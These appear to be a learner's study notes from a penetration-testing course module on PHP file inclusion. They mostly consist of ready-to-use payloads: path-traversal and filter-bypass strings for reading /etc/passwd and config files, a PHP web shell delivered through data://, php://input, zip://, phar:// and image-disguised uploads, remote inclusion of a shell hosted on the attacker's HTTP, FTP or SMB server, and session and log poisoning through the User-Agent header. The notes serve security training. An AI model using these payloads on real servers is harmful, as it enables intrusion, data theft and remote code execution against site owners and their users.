# File Inclusion
- The most common place we usually find LFI within is templating engines. In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the header, navigation bar, and footer, and then dynamically loads other content that changes between pages. Otherwise, every page on the server would need to be modified when changes are made to any of the static parts. This is why we often see a parameter like /index.php?page=about, where index.php sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called about.php.
- they all share one common thing: loading a file from a specified path.
- For example, the page may have a ?language GET parameter, and if a user changes the language from a drop-down menu, then the same page would be returned but with a different language parameter (e.g. ?language=es). In such cases, changing the language may change the directory the web application is loading the pages from (e.g. /en/ or /es/).
- Reminder: `Missing parameters` error message? add ?[then the parameters] to the url
- Regardless of the langauge, the most important thing to keep in mind is that some of the above functions only read the content of the specified files, while others also execute the specified files. Furthermore, some of them allow specifying remote URLs, while others only work with files local to the back-end server. 

This is a significant difference to note, as executing files may allow us to execute functions and eventually lead to code execution, while only reading the file's content would only let us to read the source code without code execution. 

- Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows
- Be careful of `include("./languages/" . $_GET['language']); ` in the code. Make sure the full path is used if needed `(./languages//etc/passwd)`
- If we were at the root path (/) and used ../ then we would still remain in the root path.
- In this case, if we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid: `http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd`
- As expected, the error tells us that this file does not exist. so, instead of directly using path traversal, we can prefix a / before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories: `http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd`
-  Note: This may not always work, as in this example a directory named lang_/ may not exist, so our relative path may not be correct. Furthermore, any prefix appended to our input may break some file inclusion techniques, like using PHP wrappers and filters or RFI might bypass these.
-  Also keep in mind when an extension is used in the PHP function: `include($_GET['language'] . ".php");` This may also be safer as it may restrict us to only including PHP files. In this case, if we try to read /etc/passwd, then the file included would be /etc/passwd.php, which might not exist

## Second order attacks
- This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.
- Developers often overlook these vulnerabilities, as they may protect against direct user input (e.g. from a ?page parameter), but they may trust values pulled from their database, like our username in this case. If we managed to poison our username during our registration, then the attack would be possible.
- This code is meant to stop path traversal: `$language = str_replace('../', '', $_GET['language']);\` If the error message omits the `../` string then you know the code is being sanitized.
- so try `....//` because since `../` is being removed, then it'll be left with `../` allowing us to still perform path traversal e.g `http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd`
- Also worth trying `..././` or `....\/` or `....\/` or `....////`
- Also worth trying to URl encode these characters might help
- **Note**: For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.
- Burp Decoder to encode the encoded string once again to have a double encoded string, which may also bypass other types of filters.
- Code that ensures that the file being included os under a specific path:
```
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
- To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use `../` to go back to the root directory and read the file we specify: `<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd`
## Null Bytes
- PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.
- To exploit this vulnerability, we can end our payload with a null byte (e.g. /etc/passwd%00), such that the final path passed to include() would be (/etc/passwd%00.php). This way, even though .php is appended to our string, anything after the null byte would be truncated, and so the path used would actually be /etc/passwd, leading us to bypass the appended extension.

## PHP Filters
- PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.
- The filter wrapper has several parameters, but the main ones we require for our attack are resource and read. The resource parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the read parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.
- The first step would be to fuzz for different available PHP pages with a tool like ffuf or gobuster: ` ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php`
- **Tip**: Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
- It is possible to start by reading index.php and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.
- We would be more interested in reading the PHP source code through LFI, as source codes tend to reveal important information about the web application. This is where the base64 php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including PHP files only, as discussed in the previous section.
- **Note**: The same applies to web application languages other than PHP, as long as the vulnerable function can execute files. Otherwise, we would directly get the source code, and would not need to use extra filters/functions to read the source code. Refer to the functions table in section 1 to see which functions have which privileges.
- Base64 encoded file to get it's contents rather than have the code execute and get it rendered.'
- Example URL: `http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config`
- Where config is the PHP file you've found from brute forcing.

## PHP Wrappers
### Data
- The `data` wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.
- To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where X.Y is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it: `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` then decode etc.
-  It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.
-  Base64 basic PHP web shell: echo `'<?php system($_GET["cmd"]); ?>' | base64`
-  Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`: `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`
### Input 
- Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier.
- To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack: `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid`
### Expect
- Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following: `Lumington@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect`

## Remote File Inclusion (RFI)
If the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
    - Enumerating local-only ports and web applications (i.e. SSRF)
    - Gaining remote code execution by including a malicious script that we host

### Verify RFI
Remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI: `echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include`
- This is checking for the PHP configuration file found at either (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where X.Y is your install PHP version. It's base64 encoded to avoid itbreaking the URL
- However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included: `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
- Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

## RCE with RFI
- The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.
- Now, we can start a server on our machine with a basic python server with the following command, as follows: `sudo python3 -m http.server <LISTENING_PORT>`
- Now, we can include our local shell through RFI. We will also specify the command to be executed with &cmd=id: `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
- Basic FTP server: `sudo python -m pyftpdlib -p 21`
- This may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the ftp:// scheme in the URL, as follows: `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
-  By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows: `http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id`
- If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
- We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default, as follows: `impacket-smbserver -smb2support share $(pwd)`
- Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier: `http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`
- SMB is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
- We get that base64 encoded thing from this command: `http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`

## LFI and File Uploads
- For the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
- Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows: `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
- Note: We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The File Upload Attacks module goes more in depth for file type attacks, and the same logic can be applied here.
- Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL: `<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">`
- Note: As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.
- With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows: `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
- This works for zip upload: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` with `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
- Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
- This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` accessible via this URL: `http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
- Regular old jpeg is the most reliable.

## PHP Session Poisoning
Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.
- The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison.
- Knowing that it's stored in `/var/lib/php/sessions/` we can include that in our LFI: `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
- Name a page the webshell: `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
- Must apply after every command

## Server Log Poisoning
The idea here is that we put a webshell in the .log file and then access it via the LFI to get RCE
- Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.
- Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.
- By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.
- So, let's try including the Apache access log from /var/log/apache2/access.log, and see what we get: `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`
- Tip: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.
- To do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning:
- We may also poison the log by sending a request through cURL, as follows:
```
Lumington@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
Lumington@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

## Automated Scanning
The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.
- We can fuzz for common GET parameters, as follows: `ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`
- Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests discussed in this module. This is not unique to LFI vulnerabilities but also applies to most web vulnerabilities discussed in other modules, as exposed parameters may be vulnerable to any other vulnerability as well.
- [good worklist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)


### Fuzzing Server Files
In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: Server webroot path, server configurations file, and server logs.

## Preventing Directory Traversal
If attackers can control the directory, they can escape the web application and attack something they are more familiar with or use a universal attack chain. The directory traversal could potentially allow attackers to do any of the following:
    - Read /etc/passwd and potentially find SSH Keys or know valid user names for a password spray attack
    - Find other services on the box such as Tomcat and read the tomcat-users.xml file
    - Discover valid PHP Session Cookies and perform session hijacking
    - Read current web application configuration and source code

- Reminder for fuzzing: run the scan with and without a backslash in front of the FUZZ word and also try it both URL and non URL encoded.
